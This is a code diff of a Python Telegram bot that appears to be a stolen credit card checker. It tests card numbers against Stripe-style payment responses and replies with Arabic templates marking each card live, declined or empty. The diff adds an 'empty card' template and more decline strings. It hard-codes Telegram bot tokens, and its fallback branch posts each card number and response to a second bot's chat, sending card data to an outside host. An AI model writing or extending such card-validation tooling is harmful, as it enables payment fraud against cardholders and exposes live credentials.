@@ -1,12 +1,11 @@
 import requests
 import telebot
-import user_agent
 from telebot import types
 import os
 from vip import Tele
 
 
-token = '7329275120:AAHtYLasQLyUulhzoaeXyiM4D63SKxISaJs'
+token = '7419176394:AAHDN9Ly_zh_JbcsgvJTDWiFeh8W-d-XTSo'
 
 #astlam
 tok = '7073895874:AAGU3cxwZjj0KbZlr7Vw6wnPuAnAMxaDCQ8'
@@ -174,8 +173,7 @@ def strip(message):
 						
 
 						
-					print(last)
-					
+
 					ap=(f"""
 ◆ البطاقة
 »» {cc}
@@ -218,6 +216,26 @@ def strip(message):
  ━━━━━━━━━━━━━━━━━          
 ◆ المعرف 
 »» @EbrahimEldsoky""")
+
+					nomo =(f"""◆ البطاقة
+»» {cc}
+◆ صلاحية البطاقة 
+»» بطاقة فارغة
+
+◆ اسم البوابة
+»» استريب لايف ✅
+ ━━━━━━━━━━━━━━━━━          
+◆ البين 
+»» {cc[:6]}
+◆ الدولة
+»» {cn} - {emj}
+◆ البنك 
+»» {bank}
+◆ معلومات البطاقة
+»» {url} - {typ} - {dicr} 
+━━━━━━━━━━━━━━━━━          
+◆ المعرف 
+»» @EbrahimEldsoky""")			
 	
 		
 					charge =(f"""◆ البطاقة
@@ -241,7 +259,7 @@ def strip(message):
 »» @EbrahimEldsoky""")				
 					
 					
-					if "Your card was declined" in last or "Your card's security code is invalid" in last or 'Invalid account' in last or  'Your card number is incorrect' in last or 'Your card number is incorrect' in last or "Your card's expiration month is invalid" in last or "Your card's expiration month is invalid" in last or "Your card's expiration year is invalid" in last or "The Year field is required." in last:								
+					if "Your card was declined" in last or "Your card's security code is invalid" in last or 'Invalid account' in last or  'Your card number is incorrect' in last or 'Your card number is incorrect' in last or "Your card's expiration month is invalid" in last or "Your card's expiration month is invalid" in last or "Your card's expiration year is invalid" in last or "The Year field is required." in last or "This PaymentIntent's payment_method could not be updated because it has a status of canceled. You may only update the payment_method of a PaymentIntent with one of the following statuses: requires_payment_method, requires_confirmation, requires_action." in last or 'Authentication Required:' in last:
 						if dd == 0:
 							dd+=2
 						else:
@@ -359,7 +377,7 @@ def strip(message):
 						
 					elif 'Insufficient Funds' in last:
 						ch += 1
-						bot.reply_to(message,charge)
+						bot.reply_to(message,nomo)
 
 					elif 'Your card does not support this type of purchase.' in last:
 						nosh+=1
@@ -381,10 +399,10 @@ def strip(message):
 					elif 'incomplete' in last:			
 						live+=1
 						bot.reply_to(message,ap)
-						
+					
+				
 						
 					else:
-						print(last)
 						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text={cc}\n{iid}\n{last}')
 						
 		except Exception as e:
